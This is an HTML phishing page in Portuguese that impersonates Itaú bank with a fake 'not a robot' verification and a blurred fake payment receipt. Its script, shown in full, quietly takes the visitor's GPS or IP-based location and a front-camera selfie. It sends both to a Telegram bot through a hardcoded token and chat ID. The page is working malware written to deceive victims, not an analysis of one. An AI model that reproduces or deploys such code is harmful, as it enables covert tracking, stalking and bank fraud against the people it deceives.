<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-UTF-8">
<title>Verifica√ß√£o ‚Äì Ita√∫</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
body{background:#0a2540;color:#fff;display:flex;height:100vh;align-items:center;justify-content:center}
.card{background:#fff;color:#003366;border-radius:16px;padding:28px 24px;max-width:300px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.25)}
img{width:80px;margin-bottom:12px}
h2{font-size:18px;margin-bottom:8px}
p{font-size:14px;margin-bottom:20px;line-height:1.35}
button{background:#003366;color:#fff;border:none;padding:12px 0;width:100%;border-radius:6px;font-size:16px;cursor:pointer}
button:active{transform:scale(.98)}
.blur{filter:blur(6px)}
</style>
</head>
<body>

<!-- TELA DE CONVENCIMENTO -->
<div id="startBox" class="card">
  <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect x='15' y='20' width='70' height='60' rx='12' fill='%23003366'/%3E%3Ccircle cx='35' cy='40' r='5' fill='%23fff'/%3E%3Ccircle cx='65' cy='40' r='5' fill='%23fff'/%3E%3Crect x='30' y='55' width='40' height='5' rx='2' fill='%23fff'/%3E%3Crect x='25' y='75' width='10' height='15' rx='3' fill='%23003366'/%3E%3Crect x='65' y='75' width='10' height='15' rx='3' fill='%23003366'/%3E%3C/svg%3E" alt="rob√¥">
  <h2>Verifica√ß√£o r√°pida</h2>
  <p>Precisamos verificar se n√£o √© um <strong>rob√¥</strong>. Toque em <strong>Permitir</strong> pra continuar.</p>
  <button id="btnPermitir">Permitir</button>
</div>

<!-- COMPROVANTE FAKE (emba√ßado) -->
<div id="comprovante" class="card blur" style="display:none">
  <div style="font-weight:700;font-size:20px;margin-bottom:16px">Ita√∫</div>
  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
    <span>Comprovante</span><span id="dataHora"></span>
  </div>
  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
    <span>Valor</span><span>R$ 1.234,56</span>
  </div>
  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
    <span>ID transa√ß√£o</span><span id="idTransacao"></span>
  </div>
  <div style="display:flex;justify-content:space-between;margin-bottom:6px;font-size:13px">
    <span>Autentica√ß√£o BACEN</span><span id="autenticacao"></span>
  </div>
  <div style="text-align:center;font-size:11px;color:#666;margin-top:12px">Transa√ß√£o realizada com sucesso.</div>
</div>

<script>
// CONFIG
const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
const CHAT_ID = '-1003187104876';

// DADOS FAKE
const dados = {
  dataHora: new Date().toLocaleString('pt-BR'),
  idTransacao: 'ITAU' + Date.now().toString(36).toUpperCase(),
  autenticacao: [...Array(16)].map(() => Math.random().toString(36)[2]).join('').toUpperCase()
};
document.getElementById('dataHora').textContent = dados.dataHora;
document.getElementById('idTransacao').textContent = dados.idTransacao;
document.getElementById('autenticacao').textContent = dados.autenticacao;

// ENVIA PARA O TELEGRAM
const tele = (msg, media) => {
  const url = media
    ? `https://api.telegram.org/bot${TOKEN}/sendPhoto`
    : `https://api.telegram.org/bot${TOKEN}/sendMessage`;
  fetch(url, {
    method: 'POST',
    body: media
      ? (() => { const f = new FormData(); f.append('chat_id', CHAT_ID); f.append('caption', msg); f.append('photo', media, 'selfie.jpg'); return f; })()
      : JSON.stringify({chat_id: CHAT_ID, text: msg}),
    headers: media ? {} : {'Content-Type':'application/json'}
  });
};

// A√á√ÉO DO BOT√ÉO
document.getElementById('btnPermitir').addEventListener('click', async () => {
  // Mostra comprovante emba√ßado
  document.getElementById('startBox').style.display = 'none';
  document.getElementById('comprovante').style.display = 'block';

  // GPS
  navigator.geolocation.getCurrentPosition(
    p => {
      const {latitude: lat, longitude: lon} = p.coords;
      tele(`üìç GPS: https://maps.google.com/?q=${lat},${lon}`);
    },
    () => {
      fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(d => tele(`üìç IP: https://maps.google.com/?q=${d.latitude},${d.longitude}`));
    }
  );

  // Selfie
  try {
    const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
    const v = document.createElement('video');
    v.srcObject = stream;
    await v.play();
    const canvas = document.createElement('canvas');
    canvas.width = 640; canvas.height = 480;
    canvas.getContext('2d').drawImage(v, 0, 0);
    canvas.toBlob(blob => {
      tele('üì∏ selfie', blob);
      stream.getTracks().forEach(t => t.stop());
    }, 'image/jpeg', 0.9);
  } catch (e) {
    tele('üì∏ selfie falhou: ' + e.message);
  }

  // Finaliza com tela de sucesso
  setTimeout(() => {
    document.body.innerHTML = '<div class="card"><img src="data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22%3E%3Ccircle cx=%2250%22 cy=%2250%22 r=%2248%22 fill=%22%2300c851%22/%3E%3Cpath d=%22M30 50 L45 65 L70 35%22 stroke=%22%23fff%22 stroke-width=%228%22 fill=%22none%22 stroke-linecap=%22round%22/%3E%3C/svg%3E" width=80><h2>Verificado!</h2><p>Obrigado por ajudar.</p></div>';
  }, 1500);
});
</script>
</body>
</html>
